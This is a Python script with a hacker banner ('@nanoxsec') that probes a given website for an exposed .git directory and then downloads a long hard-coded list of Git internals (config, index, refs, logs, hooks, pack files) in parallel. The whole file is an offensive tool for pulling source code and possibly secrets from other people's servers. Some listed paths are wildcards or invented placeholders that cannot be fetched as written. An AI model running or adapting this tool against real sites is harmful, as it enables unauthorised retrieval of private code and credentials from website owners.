import os
import requests
import logging
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep

os.system("clear")

print("""\033[31m
 _____ _ _   _____ _ _         
|   __|_| |_|   __|_| |___ ___ 
|  |  | |  _|   __| | | -_|_ -|
|_____|_|_| |__|  |_|_|___|___|
    \033[mInstagram: @nanoxsec
""")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
def baixar_arquivo(url, caminho_destino):
    try:
        resposta = requests.get(url, timeout=10)
        if resposta.status_code == 200:
            os.makedirs(os.path.dirname(caminho_destino), exist_ok=True)
            try:
              with open(caminho_destino, 'wb') as f:
                  f.write(resposta.content)
              logger.info(f"\033[32mBaixado\033[m: {caminho_destino}")
            except IsADirectoryError:
              pass
        else:
            logger.warning(f"\033[31mFalha ao baixar\033[m {url}, código de status {resposta.status_code}")
    except requests.RequestException as e:
        logger.error(f"Erro ao baixar {url}: {e}")
def verificar_git_exposto(url_base):
    try:
        resposta = requests.get(url_base, timeout=5)
        if resposta.status_code == 200:
            logger.info(f"Repositório Git exposto encontrado: {url_base}\n")
            sleep(0.1)
            return True
        else:
            logger.info(f"Sem repositório Git exposto em: {url_base}")
            return False
    except requests.RequestException as e:
        logger.error(f"Erro ao verificar {url_base}: {e}")
        return False
def baixar_git_repo(url_base, arquivos_git):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for arquivo in arquivos_git:
            url = f"{url_base}/{arquivo}"
            caminho_destino = arquivo.lstrip("/")
            futures.append(executor.submit(baixar_arquivo, url, caminho_destino))
        for future in as_completed(futures):
            future.result()
def processar_repositorios(repositorios):
    for url_base in repositorios:
        logger.info(f"Processando repositório: {url_base}")
        if verificar_git_exposto(url_base):
            arquivos_git = [
    ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG", ".git/description",
    ".git/hooks/applypatch-msg.sample", ".git/hooks/commit-msg.sample", 
    ".git/hooks/post-commit.sample", ".git/hooks/post-receive.sample",
    ".git/hooks/pre-commit.sample", ".git/hooks/pre-push.sample",
    ".git/index", ".git/info/exclude", ".git/objects/info/packs",
    ".git/hooks/applypatch-msg", ".git/hooks/commit-msg", ".git/hooks/post-commit",
    ".git/hooks/post-receive", ".git/hooks/pre-commit", ".git/hooks/pre-push",
    ".git/hooks/pre-receive", ".git/hooks/update",
    ".git/objects/", ".git/objects/pack/", ".git/objects/info/", ".git/objects/pack/pack-*.idx",
    ".git/objects/pack/pack-*.pack", ".git/objects/pack/pack-*.tmp",
    ".git/refs/heads/", ".git/refs/remotes/", ".git/refs/tags/",
    ".git/refs/heads/master", ".git/refs/heads/main", ".git/refs/remotes/origin/master",
    ".git/refs/tags/v1.0.0", ".git/refs/tags/v2.0.0",
    ".git/info/exclude", ".git/info/attributes", ".git/info/refs", ".git/info/commit-graph",
    ".git/info/grafts", ".git/info/packfile", ".git/info/lockfile",
    ".git/modules", ".git/modules/submodule1", ".git/modules/submodule2",
    ".git/logs/HEAD", ".git/logs/refs/heads/master", ".git/logs/refs/remotes/origin/master",
    ".git/logs/refs/tags/v1.0.0", ".git/logs/refs/tags/v2.0.0", ".git/logs/refs/remotes/origin/main",
    ".git/logs/refs/heads/main", ".git/logs/HEAD.lock",
    ".git/modules/submodule1/config", ".git/modules/submodule2/config",
    ".git/lfs/objects", ".git/lfs/objects/01/02/0304050607", ".git/lfs/objects/02/0304050607",
    ".git/lfs/objects/03/04050607", ".git/lfs/config", ".git/lfs/locks",
    ".git/refs/heads/develop", ".git/refs/remotes/upstream/master", ".git/refs/heads/feature1",
    ".git/refs/tags/v1.2.0", ".git/refs/tags/v1.3.0",
    ".git/index.lock", ".git/HEAD.lock", ".git/objects/pack/*.idx", ".git/objects/pack/*.pack",
    ".git/rebase-apply", ".git/rebase-merge", ".git/merge-queue", ".git/mergetool",
    ".git/refs/stash", ".git/refs/rebase-merge", ".git/refs/merge-queue",
    ".git/logs/refs/heads/feature-x", ".git/logs/refs/heads/bugfix-y",
    ".git/modules/module-a/config", ".git/modules/module-b/config",
    ".git/grafts", ".git/commondir", ".git/index.lock", ".git/info/refs.lock",
    ".git/objects/pack/pack-*.tmp", ".git/objects/pack/pack-*.idx", ".git/objects/pack/pack-*.pack",
    ".git/objects/00/", ".git/objects/01/", ".git/objects/02/", ".git/objects/03/",
    ".git/objects/04/", ".git/objects/05/", ".git/objects/06/", ".git/objects/07/",
    ".git/rebase-apply", ".git/rebase-merge", ".git/merge-queue",
    ".git/refs/heads/feature-x", ".git/refs/heads/bugfix-y",
    ".git/mergetool", ".git/merge-queue", ".git/rebase-apply", ".git/rebase-merge"]
            baixar_git_repo(url_base, arquivos_git)
        else:
            logger.info(f"Repositório {url_base} não está exposto ou não contém arquivos .git")

def main():
    parser = argparse.ArgumentParser(description="Ferramenta para baixar arquivos de repositórios Git expostos")
    parser.add_argument("url", help="URL do repositório Git exposto (ex: http://example.com/.git)", type=str)
    args = parser.parse_args()
    repositorios = [args.url]
    processar_repositorios(repositorios)

if __name__ == "__main__":
    main()
